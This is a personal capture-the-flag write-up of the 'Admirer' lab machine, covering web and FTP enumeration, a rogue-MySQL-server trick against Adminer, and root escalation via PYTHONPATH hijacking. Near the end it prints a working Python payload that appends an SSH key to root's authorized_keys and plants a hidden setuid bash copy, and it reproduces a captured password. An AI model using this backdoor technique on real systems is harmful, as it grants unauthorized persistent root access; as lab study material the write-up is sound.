# Admirer

Admirer

Monday, 14 February 2022

11:59 am

This is a Linux machine.

My IP is 10.10.16.9.

The target IP is 10.10.10.187.

&#x20;

Fast scan reveals that there are a few ports open.

!\[\[38\_Admirer\_image001.png]]

Alright, HTTP, SSH and FTP.

&#x20;

Ran a vuln script on nmap to determine a few things.

&#x20;

!\[\[38\_Admirer\_image002.png]]

Good to know there's the robots.txt file there.

&#x20;

Visiting the website shows that this is some kind of photo gallery or something.

!\[\[38\_Admirer\_image003.png]]

&#x20;

Ran a directory scan on the website.

!\[\[38\_Admirer\_image004.png]]

This is what's present on it. Let's check out the robots.txt file first.

&#x20;

!\[\[38\_Admirer\_image005.png]]

This tells us another directory, and let's go view that. Seems like I don't have access to it anyways.

&#x20;

!\[\[38\_Admirer\_image006.png]]

&#x20;

I think the user might be waldo, but I'm not sure.

Ran a directory scan against admin-dir.

&#x20;

!\[\[38\_Admirer\_image007.png]]

&#x20;

There are status 200s, which is always a good sign.

!\[\[38\_Admirer\_image008.png]]

&#x20;

Good sign, we now have access to that FTP account.

With this, I could find these two files.

!\[\[38\_Admirer\_image009.png]]

&#x20;

Intriguing. Extracted everything from the HTML file and found this.

!\[\[38\_Admirer\_image0010.png]]

I think we know which one is the most suspicious.

Turns out, this is just the things I have already enumerated before.

&#x20;

{width="5.302083333333333in" height="3.84375in"}

&#x20;

!\[\[38\_Admirer\_image0012.png]]

&#x20;

Now, however, there's a bank account. Cool.

Next, we can view the utility\_scripts and there's a db-admin.php which contains more credentials.

!\[\[38\_Admirer\_image0013.png]]

This is to the mysql server, and I suppose later we'll be using this to dump something out.

Looking around more, I found there was a admin\_tasks.php file within this.

&#x20;

{width="9.729166666666666in" height="7.125in"}

&#x20;

Interestingly, it executes some shell code. It's present on the website as well.

!\[\[38\_Admirer\_image0015.png]]

This can do the tasks it's told to do, nothing much more than that.

&#x20;

I spent a lot of time on this stage, wondering about how I can progress. The db\_admin.php page is not present, and I was wondering why the others were present.

&#x20;

Did another big directory enumeration, but I didn't find anything new. I know the database is something to do with MySQL, and it's some form of GUI. I know there's a phpmyadmin format of it. A bit of googling led me to adminer, which is a light-weight version of phpmyadmin.

!\[\[38\_Admirer\_image0016.png]]

Tried it, and I found it.

&#x20;

!\[\[38\_Admirer\_image0017.png]]

However, no credentials work with this website.

&#x20;

I googled more and more, seem to have stumbled upon this.

!\[\[38\_Admirer\_image0018.png]]

Let's take a look and try it out.

So basically we need to create our own database and connect that to the Adminer interface, and from our own database, we can dump out the database of the victim machine.

&#x20;

Create our own SQL server using [this.](https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue\_mysql\_server.py)

Connect to our own SQL server using the adminer, we can just use our linux machine password to connect.

Be sure to create a database using this, and from there we can view the logs and find the password.

{width="8.541666666666666in" height="3.5416666666666665in"}

For some reason, I was unable to create a database using mysql server. I know that the vulnerability is to create an SQL server and then attempt to connect to it. From there, we can use our own database and begin exfiltrating information and stuff that is present on the machine.

&#x20;

Unfortunately, I was unable to recreate this.

As such, I will be skipping this bit for now, and taking the password from a walkthrough.

&#x20;

&\<h5b\~yK3F#{PaPB\&dA}{H>

&#x20;

Once on waldo through SSH, we can see that we are able to run the following:

{width="12.15625in" height="1.625in"}

This script is the same script that runs the admin\_tasks thing we found on the webpage.

&#x20;

Inside the directory, there's another backup.py script with this following code.

!\[\[38\_Admirer\_image0021.png]]

Seems to use shutil or something and makes an archive of the directory. The script within the .sh also uses this python script to run the backup\_web() function.

{width="8.53125in" height="2.375in"}

&#x20;

So this script runs this python code, and we can directly just change the PYTHONPATH of the script or something I think, because right now it does not do that.

&#x20;

Add a directory to the PYTHONPATH, which would cause the python script within /tmp to execute.

!\[\[38\_Admirer\_image0023.png]]

&#x20;

Anyways, I remember learning about the usage of SSH public keys to login automatically as root.

&#x20;

I got my SSH public key, and I created this script.

\#!/usr/bin/python3

&#x20;

import os

&#x20;

def make\_archive(a,b,c):

pass

&#x20;

os.system("mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZElLTPicEqkXTHXx8P67CUmCpbVFyGSf5MvjxIs8WgPiyGynAQ7tQh4pnWCpQXbl0TwVa0GZoseYhKy6+l2AH8pcOZQ8JKTKfeIMxPwC2QyL2Y0bR+hggPVkL35GRTb1KtTO5xBKiPGLoVyOQx2sZrM9nhfiNwGRxFLs6teXZqTskWP0wyg9QrOUK2m1fF8jeSzC1qhA8U1f3s6PUKwCkHSAz1opOIuEbSSiq0HdEPOkJ8T1QTMR3dErHZ/q/oP4gWX2Bl80zQ24p2FMory/L/kq2sgRrdz78VTUmdpMD7wTMkKyGieFkaDIKbEKcnnOymX/eWqnJzG6C5mzNWiEn5MlrsGlduhZUcQX/locnPsKdLNJViTtJInfL+atG1UjMLXELbfA3fvaRe4nq4s4s/x9MPktRncCFiVnka4XCcZDW136lvcHfiNQt3BNflwTPj62aQYCNNOIYScKiciMKHsKeLNLBdefV49ibm7cX937odZfBJYMK84sJKXH35zk= root@kali' >> /root/.ssh/authorized\_keys")

os.system('cp /bin/bash /var/tmp/.user; chown root:root /var/tmp/.user; chmod 4755 /var/tmp/.user')

&#x20;

What this does is add my ssh public key directly into that of the root's authorized keys. This would make it such that I am able to log in automatically.

&#x20;

Port this script using HTTP.

Now, I just need to edit the PYTHONPATH when running this script to look for modules within the directory I installed this script in on the victim machine.

!\[\[38\_Admirer\_image0024.png]]

When looking at the admin\_tasks.sh again, I can see that the function that calls this python script is task 6, hence we run it accordingly.

Run this, and it should work.

&#x20;

Now we can try to SSH in.

&#x20;

!\[\[38\_Admirer\_image0025.png]]

&#x20;

This will work out, and we can pwn the box.

&#x20;

I did this box with help of a walkthrough, because I was completely walled by the SQL side and was not 100% clear of the authorized key method.

&#x20;

This however, made me more clear with the usage of scripts that we can run on target machines to echo in my public key.

&#x20;

Learnt a bit more about PYTHONPATH too, and how it can be abused to determine where python looks for modules in.

&#x20;

Overall, this was a challenging box, and definitely not as easy as others say it is.

&#x20;

&#x20;
